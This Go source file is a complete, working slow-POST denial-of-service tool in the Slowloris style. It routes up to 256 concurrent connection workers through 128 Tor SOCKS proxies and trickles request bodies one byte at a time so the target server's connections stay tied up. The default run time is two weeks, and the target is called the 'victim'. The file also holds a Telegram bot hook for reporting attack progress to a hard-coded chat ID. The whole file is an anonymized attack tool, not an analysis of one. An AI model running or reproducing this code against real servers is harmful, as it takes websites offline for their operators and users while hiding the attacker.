package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strings"
	"syscall"
	"time"

	log "github.com/sirupsen/logrus"

	"golang.org/x/net/proxy"
)

func handleSignals(sigs <-chan os.Signal, done chan<- struct{}) {
	sig := <-sigs
	log.Printf("received %s - exiting\n", sig)
	fmt.Println(sig)
	os.Exit(0)
}

var (
	contentLength = flag.Int(
		"contentLength",
		1000*1000,
		"The maximum length of fake POST body in bytes. Adjust to nginx's client_max_body_size",
	)
	dialWorkersCount = flag.Int(
		"dialWorkersCount",
		256,
		"The number of workers simultaneously busy with opening new TCP connections",
	)
	goMaxProcs = flag.Int(
		"goMaxProcs",
		32,
		"The maximum number of CPUs to use. Don't touch :)",
	)
	rampUpInterval = flag.Duration(
		"rampUpInterval",
		2*time.Second,
		"Interval between new connections' acquisitions for a single dial worker (see dialWorkersCount)",
	)
	sleepInterval = flag.Duration(
		"sleepInterval",
		500*time.Millisecond,
		"Sleep interval between subsequent packets sending. Adjust to nginx's client_body_timeout",
	)
	testDuration = flag.Duration(
		"testDuration",
		336*time.Hour, // 2 weeks
		"Test duration",
	)
	victimUrl = flag.String(
		"victimUrl",
		"http://127.0.0.1/",
		"Victim's url. Http POST must be allowed in nginx config for this url",
	)
	hostHeader = flag.String(
		"hostHeader",
		"",
		"Host header value in case it is different than the hostname in victimUrl",
	)

	lastReportMinute = 0
)

var (
	sharedReadBuf  = make([]byte, 4096)
	sharedWriteBuf = []byte("A")

	tlsConfig = &tls.Config{
		InsecureSkipVerify: true,
	}

	initialTorPort = 9060
	torPorts       = make([]int, 128)
)

func main() {
	log.Println("starting...")
	sigs := make(chan os.Signal, 1)
	signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)
	done := make(chan struct{}, 1)
	go handleSignals(sigs, done)

	rand.Seed(time.Now().UTC().UnixNano())

	torPorts[0] = initialTorPort
	for i := 1; i < 128; i++ {
		torPorts[i] = torPorts[i-1] + 10
	}

	flag.Parse()
	flag.VisitAll(func(f *flag.Flag) {
		fmt.Printf("%s=%v\n", f.Name, f.Value)
	})

	runtime.GOMAXPROCS(*goMaxProcs)

	victimUri, err := url.Parse(*victimUrl)
	if err != nil {
		log.Fatalf("Cannot parse victimUrl=[%s]: [%s]\n", *victimUrl, err)
	}
	victimHostPort := victimUri.Host
	if !strings.Contains(victimHostPort, ":") {
		port := "80"
		if victimUri.Scheme == "https" {
			port = "443"
		}
		victimHostPort = net.JoinHostPort(victimHostPort, port)
	}
	host := victimUri.Host
	if len(*hostHeader) > 0 {
		host = *hostHeader
	}
	requestHeader := []byte(fmt.Sprintf(
		"POST %s HTTP/1.1\n"+
			"Host: %s\nContent-Type: application/x-www-form-urlencoded"+
			"\nContent-Length: %d"+
			"\nX-CSRFToken: 03d8646473a8d37dc4fc"+
			"\nCookie: csrftoken=03d8646473a8d37dc4fc; clientinfo=1280:720:1.5; sessionid=166f21ef87bad977c324"+
			"\n\n",
		victimUri.RequestURI(), host, *contentLength,
	))

	dialWorkersLaunchInterval := *rampUpInterval / time.Duration(*dialWorkersCount)
	activeConnectionsCh := make(chan int, *dialWorkersCount)
	go activeConnectionsCounter(activeConnectionsCh)
	for i := 0; i < *dialWorkersCount; i++ {
		go dialWorker(activeConnectionsCh, victimHostPort, victimUri, requestHeader)
		time.Sleep(dialWorkersLaunchInterval)
	}
	time.Sleep(*testDuration)
}

func dialWorker(
	activeConnectionsCh chan<- int,
	victimHostPort string,
	victimUri *url.URL,
	requestHeader []byte,
) {
	randomIndex := rand.Intn(len(torPorts))
	torPort := torPorts[randomIndex]

	dialer, err := proxy.SOCKS5("tcp", "127.0.0.1:"+fmt.Sprint(torPort), nil, nil)
	if err != nil {
		log.Fatal(err)
	}

	isTls := (victimUri.Scheme == "https")
	for {
		time.Sleep(*rampUpInterval)
		conn := dialVictim(dialer, victimHostPort, isTls)
		if conn != nil {
			go doLoris(conn, victimUri, activeConnectionsCh, requestHeader)
		}
	}
}

func request(botMethod string) ([]byte, error) {
	botToken := ""
	req, _ := http.NewRequest(http.MethodGet,
		fmt.Sprintf("https://api.telegram.org/bot%s/%s", botToken, botMethod), nil)
	log.Println("Sending request to telegram api.")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		log.Printf("Telegram client get failed: %s\n", err)
		return nil, err
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)

	log.Println(string(body))
	return body, nil
}

func Notify(message string) {
	chatID := "342621688"
	_, err := request(fmt.Sprintf("sendMessage?chat_id=%s&text=%s", chatID, message))
	if err != nil {
		log.Printf("Failed to send message")
	}
}

func activeConnectionsCounter(ch <-chan int) {
	var connectionsCount int
	for n := range ch {
		connectionsCount += n
		log.Printf("Holding %d connections\n", connectionsCount)
		nowMinute := time.Now().Minute()
		if nowMinute != lastReportMinute {
			// Notify(fmt.Sprint(connectionsCount))
			lastReportMinute = nowMinute
		}
	}
}

func dialVictim(dialer proxy.Dialer, hostPort string, isTls bool) io.ReadWriteCloser {
	conn, err := dialer.Dial("tcp", hostPort)
	if err != nil {
		log.Printf("Couldn't esablish connection to [%s]: [%s]\n", hostPort, err)
		return nil
	}
	tcpConn := conn.(*net.TCPConn)
	if err = tcpConn.SetReadBuffer(128); err != nil {
		log.Fatalf("Cannot shrink TCP read buffer: [%s]\n", err)
	}
	if err = tcpConn.SetWriteBuffer(128); err != nil {
		log.Fatalf("Cannot shrink TCP write buffer: [%s]\n", err)
	}
	if err = tcpConn.SetLinger(0); err != nil {
		log.Fatalf("Cannot disable TCP lingering: [%s]\n", err)
	}
	if !isTls {
		return tcpConn
	}

	tlsConn := tls.Client(conn, tlsConfig)
	if err = tlsConn.Handshake(); err != nil {
		conn.Close()
		// log.Printf("Couldn't establish tls connection to [%s]: [%s]\n", hostPort, err)
		return nil
	}
	return tlsConn
}

func doLoris(
	conn io.ReadWriteCloser,
	victimUri *url.URL,
	activeConnectionsCh chan<- int,
	requestHeader []byte,
) {
	defer conn.Close()

	if _, err := conn.Write(requestHeader); err != nil {
		log.Printf("Cannot write requestHeader=[%v]: [%s]\n", requestHeader, err)
		return
	}

	activeConnectionsCh <- 1
	defer func() { activeConnectionsCh <- -1 }()

	readerStopCh := make(chan int, 1)
	go nullReader(conn, readerStopCh)

	for i := 0; i < *contentLength; i++ {
		select {
		case <-readerStopCh:
			return
		case <-time.After(*sleepInterval):
		}
		if _, err := conn.Write(sharedWriteBuf); err != nil {
			log.Printf(
				"Error when writing %d byte out of %d bytes: [%s]\n",
				i, *contentLength, err,
			)
			return
		}
	}
}

func nullReader(conn io.Reader, ch chan<- int) {
	defer func() { ch <- 1 }()
	n, err := conn.Read(sharedReadBuf)
	if err != nil {
		log.Printf("Error when reading server response: [%s]\n", err)
	} else {
		log.Printf("Unexpected response read from server: [%s]\n", sharedReadBuf[:n])
	}
}
